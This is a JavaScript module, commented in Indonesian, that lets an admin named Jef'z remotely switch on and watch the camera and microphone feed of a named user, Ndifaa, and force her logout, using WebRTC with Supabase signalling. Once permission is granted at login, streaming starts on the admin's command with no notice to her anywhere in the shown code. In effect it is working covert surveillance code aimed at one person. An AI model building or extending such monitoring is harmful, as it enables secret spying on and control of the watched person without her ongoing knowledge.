// ================================================================
// MONITOR.JS - WebRTC Monitoring Module
// Jef'z (Admin) melihat/mendengar Ndifaa (User) secara realtime
// ================================================================

// ===== KONFIGURASI ICE SERVERS =====
// ICE servers digunakan untuk menemukan "alamat jaringan" terbaik
// STUN = gratis, cukup untuk jaringan normal
// TURN = untuk jaringan ketat (NAT), perlu daftar kalau STUN gagal
const ICE_SERVERS = {
  iceServers: [
    // Google STUN servers (gratis, tidak perlu daftar)
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
    // OpenRelay TURN server gratis (daftar di metered.ca kalau STUN gagal)
    // { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
  ]
};

// ===== STATE =====
let monitorChannel   = null;  // Supabase realtime channel untuk signaling
let peerConnection   = null;  // RTCPeerConnection - koneksi WebRTC utama
let localStream      = null;  // Stream kamera/mikrofon Ndifaa
let isVideoOn        = false; // Status tombol video admin
let isAudioOn        = false; // Status tombol audio admin
let streamActive     = false; // Apakah stream sedang aktif
let monitorInited    = false; // Sudah init atau belum

const ADMIN_NAME = "Jef'z";
const USER_NAME  = "Ndifaa";

// ===== INIT - dipanggil setelah login =====
async function initMonitor() {
  if (monitorInited) return;
  monitorInited = true;

  if (!currentAccount) return;

  if (currentAccount.name === USER_NAME) {
    // Sisi Ndifaa: minta izin kamera+mikrofon, lalu tunggu sinyal dari admin
    await initUserSide();
  } else if (currentAccount.name === ADMIN_NAME) {
    // Sisi Admin: tampilkan kontrol, tunggu stream masuk
    initAdminSide();
  }

  // Kedua sisi: listen sinyal force_logout
  listenForceLogout();
}

// ================================================================
// SISI NDIFAA (USER)
// ================================================================

async function initUserSide() {
  // Minta izin kamera + mikrofon
  try {
    localStream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
      audio: { echoCancellation: true, noiseSuppression: true }
    });
    console.log('Kamera & mikrofon siap');
  } catch (err) {
    // Jika ditolak, tampilkan pesan di UI
    showMonitorNotice('Izin kamera/mikrofon diperlukan untuk fitur monitoring. Buka Settings browser untuk mengizinkan.');
    return;
  }

  // Listen sinyal dari admin
  listenSignals(USER_NAME, async (signal) => {
    if (signal.type === 'start_stream') {
      // Admin minta stream dimulai
      await startUserStream();
    } else if (signal.type === 'stop_stream') {
      // Admin matikan stream
      stopUserStream();
    } else if (signal.type === 'answer') {
      // Admin balas offer kita dengan answer
      await handleAnswer(signal.payload);
    } else if (signal.type === 'ice_candidate') {
      // Admin kirim ICE candidate
      await handleRemoteIce(signal.payload);
    }
  });
}

async function startUserStream() {
  if (!localStream) return;

  // Buat RTCPeerConnection baru
  peerConnection = new RTCPeerConnection(ICE_SERVERS);

  // Tambahkan semua track (video + audio) ke peer connection
  localStream.getTracks().forEach(track => {
    peerConnection.addTrack(track, localStream);
  });

  // Saat ICE candidate ditemukan, kirim ke admin via Supabase
  peerConnection.onicecandidate = async (event) => {
    if (event.candidate) {
      await sendSignal({
        type:     'ice_candidate',
        from:     USER_NAME,
        to:       ADMIN_NAME,
        payload:  JSON.stringify(event.candidate)
      });
    }
  };

  // Buat Offer SDP dan kirim ke admin
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);

  await sendSignal({
    type:    'offer',
    from:    USER_NAME,
    to:      ADMIN_NAME,
    payload: JSON.stringify(offer)
  });
}

async function handleAnswer(answerPayload) {
  if (!peerConnection) return;
  const answer = JSON.parse(answerPayload);
  await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
}

function stopUserStream() {
  if (peerConnection) { peerConnection.close(); peerConnection = null; }
}

// ================================================================
// SISI ADMIN (JEF'Z)
// ================================================================

function initAdminSide() {
  // Tampilkan kontrol monitoring di topbar
  renderAdminControls();

  // Listen sinyal dari Ndifaa
  listenSignals(ADMIN_NAME, async (signal) => {
    if (signal.type === 'offer') {
      await handleOffer(signal.payload);
    } else if (signal.type === 'ice_candidate') {
      await handleRemoteIce(signal.payload);
    }
  });
}

function renderAdminControls() {
  // Tombol monitoring di topbar
  const topbarRight = document.querySelector('.topbar-right');
  if (!topbarRight || document.getElementById('monitorControls')) return;

  const wrap = document.createElement('div');
  wrap.id = 'monitorControls';
  wrap.style.cssText = 'display:flex;gap:6px;align-items:center;';

  // Tombol Video
  const videoBtn = document.createElement('button');
  videoBtn.id = 'monitorVideoBtn';
  videoBtn.className = 'tb-btn monitor-btn';
  videoBtn.title = 'Monitor Video';
  videoBtn.innerHTML = '📵';
  videoBtn.onclick = toggleMonitorVideo;
  wrap.appendChild(videoBtn);

  // Tombol Audio
  const audioBtn = document.createElement('button');
  audioBtn.id = 'monitorAudioBtn';
  audioBtn.className = 'tb-btn monitor-btn';
  audioBtn.title = 'Monitor Audio';
  audioBtn.innerHTML = '🔇';
  audioBtn.onclick = toggleMonitorAudio;
  wrap.appendChild(audioBtn);

  // Tombol Force Logout
  const logoutBtn = document.createElement('button');
  logoutBtn.id = 'forceLogoutBtn';
  logoutBtn.className = 'tb-btn';
  logoutBtn.title = 'Logout Ndifaa';
  logoutBtn.innerHTML = '⏏';
  logoutBtn.style.color = 'var(--danger)';
  logoutBtn.onclick = forceLogoutUser;
  wrap.appendChild(logoutBtn);

  // Insert sebelum theme button
  const themeBtn = topbarRight.querySelector('.theme-btn');
  if (themeBtn) topbarRight.insertBefore(wrap, themeBtn);
  else topbarRight.prepend(wrap);

  // Monitor view (video element) - hidden awalnya
  const monitorView = document.createElement('div');
  monitorView.id = 'monitorView';
  monitorView.style.cssText = 'display:none;position:fixed;bottom:calc(var(--nav-h) + 12px);right:12px;z-index:500;border-radius:16px;overflow:hidden;box-shadow:0 8px 32px rgba(0,0,0,0.4);border:2px solid rgba(255,255,255,0.2);';
  monitorView.innerHTML =
    '<video id="monitorVideo" autoplay playsinline style="width:200px;height:150px;object-fit:cover;display:block;background:#000;"></video>' +
    '<div style="position:absolute;top:6px;left:8px;font-size:10px;font-weight:600;color:white;text-shadow:0 1px 4px rgba(0,0,0,0.8);">📡 LIVE</div>' +
    '<button onclick="hideMonitorView()" style="position:absolute;top:4px;right:4px;background:rgba(0,0,0,0.5);border:none;color:white;border-radius:50%;width:22px;height:22px;font-size:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;">✕</button>';
  document.body.appendChild(monitorView);
}

async function toggleMonitorVideo() {
  isVideoOn = !isVideoOn;
  const btn = document.getElementById('monitorVideoBtn');

  if (isVideoOn) {
    btn.innerHTML = '📹';
    btn.style.color = '#34c759';
    // Kirim sinyal ke Ndifaa untuk mulai stream
    await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
    streamActive = true;
    toast('Monitoring dimulai');
  } else {
    btn.innerHTML = '📵';
    btn.style.color = '';
    // Kirim sinyal stop
    await sendSignal({ type: 'stop_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
    stopAdminStream();
  }
}

async function toggleMonitorAudio() {
  isAudioOn = !isAudioOn;
  const btn  = document.getElementById('monitorAudioBtn');
  const vid  = document.getElementById('monitorVideo');

  if (isAudioOn) {
    btn.innerHTML = '🔊';
    btn.style.color = '#34c759';
    if (vid) vid.muted = false;

    // Kalau video belum on, mulai stream juga (audio saja)
    if (!isVideoOn && !streamActive) {
      await sendSignal({ type: 'start_stream', from: ADMIN_NAME, to: USER_NAME, payload: '{}' });
      streamActive = true;
    }
    toast('Audio monitoring aktif');
  } else {
    btn.innerHTML = '🔇';
    btn.style.color = '';
    if (vid) vid.muted = true;
    toast('Audio muted');
  }
}

async function handleOffer(offerPayload) {
  // Terima offer dari Ndifaa, buat answer
  peerConnection = new RTCPeerConnection(ICE_SERVERS);

  // Saat ICE candidate ditemukan, kirim ke Ndifaa
  peerConnection.onicecandidate = async (event) => {
    if (event.candidate) {
      await sendSignal({
        type:    'ice_candidate',
        from:    ADMIN_NAME,
        to:      USER_NAME,
        payload: JSON.stringify(event.candidate)
      });
    }
  };

  // Saat stream dari Ndifaa masuk, pasang ke video element
  peerConnection.ontrack = (event) => {
    const vid = document.getElementById('monitorVideo');
    if (!vid) return;
    if (vid.srcObject !== event.streams[0]) {
      vid.srcObject = event.streams[0];
      vid.muted = !isAudioOn; // mute sesuai setting audio
    }
    // Tampilkan monitor view
    const view = document.getElementById('monitorView');
    if (view) view.style.display = 'block';
  };

  // Set offer sebagai remote description
  const offer = JSON.parse(offerPayload);
  await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));

  // Buat answer
  const answer = await peerConnection.createAnswer();
  await peerConnection.setLocalDescription(answer);

  // Kirim answer ke Ndifaa
  await sendSignal({
    type:    'answer',
    from:    ADMIN_NAME,
    to:      USER_NAME,
    payload: JSON.stringify(answer)
  });
}

function stopAdminStream() {
  if (peerConnection) { peerConnection.close(); peerConnection = null; }
  streamActive = false;
  const view = document.getElementById('monitorView');
  if (view) view.style.display = 'none';
  const vid = document.getElementById('monitorVideo');
  if (vid) { vid.srcObject = null; }
  // Reset audio btn juga
  isAudioOn = false;
  const audioBtn = document.getElementById('monitorAudioBtn');
  if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
  toast('Monitoring dimatikan');
}

function hideMonitorView() {
  const view = document.getElementById('monitorView');
  if (view) view.style.display = 'none';
}

// ================================================================
// FORCE LOGOUT
// ================================================================

async function forceLogoutUser() {
  const ok = await showConfirm('Logout Ndifaa dari semua device?', {
    icon: '⏏', title: 'Force Logout', okText: 'Logout', cancelText: 'Batal'
  });
  if (!ok) return;

  try {
    await sb.rpc('force_logout_user', { p_username: USER_NAME });
    toast('Ndifaa berhasil di-logout');
  } catch (err) {
    toast('Gagal logout', false);
  }
}

function listenForceLogout() {
  if (currentAccount && currentAccount.name === USER_NAME) {
    // Ndifaa listen sinyal force logout
    const ch = sb.channel('force_logout_' + Date.now())
      .on('postgres_changes', {
        event:  'INSERT',
        schema: 'public',
        table:  'webrtc_signals',
        filter: 'to_user=eq.' + USER_NAME + '&type=eq.force_logout'
      }, () => {
        // Langsung logout
        sessionStorage.clear();
        window.location.href = 'index.html';
      })
      .subscribe();
  }
}

// ================================================================
// SHARED HELPERS
// ================================================================

// Kirim sinyal lewat Supabase
async function sendSignal({ type, from, to, payload }) {
  try {
    await sb.from('webrtc_signals').insert([{
      type,
      from_user: from,
      to_user:   to,
      payload:   payload || '{}'
    }]);
  } catch (err) {
    console.error('sendSignal error:', err);
  }
}

// Listen sinyal yang masuk untuk user tertentu
function listenSignals(forUser, callback) {
  if (monitorChannel) { try { sb.removeChannel(monitorChannel); } catch (e) {} }

  monitorChannel = sb.channel('monitor_signals_' + Date.now())
    .on('postgres_changes', {
      event:  'INSERT',
      schema: 'public',
      table:  'webrtc_signals',
      filter: 'to_user=eq.' + forUser
    }, (payload) => {
      if (!payload.new) return;
      callback(payload.new);
    })
    .subscribe();
}

// Handle ICE candidate dari remote
async function handleRemoteIce(icePayload) {
  if (!peerConnection) return;
  try {
    const candidate = JSON.parse(icePayload);
    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
  } catch (e) {}
}

// Tampilkan notice ke Ndifaa
function showMonitorNotice(msg) {
  const el = document.getElementById('toast');
  if (!el) return;
  el.textContent = msg;
  el.className = 'toast show err';
  setTimeout(() => { el.className = 'toast'; }, 8000);
}

// ================================================================
// AUTO INIT saat dashboard load
// ================================================================
document.addEventListener('DOMContentLoaded', () => {
  // Delay sedikit agar currentAccount sudah terisi dari dashboard.js
  setTimeout(initMonitor, 1000);
});
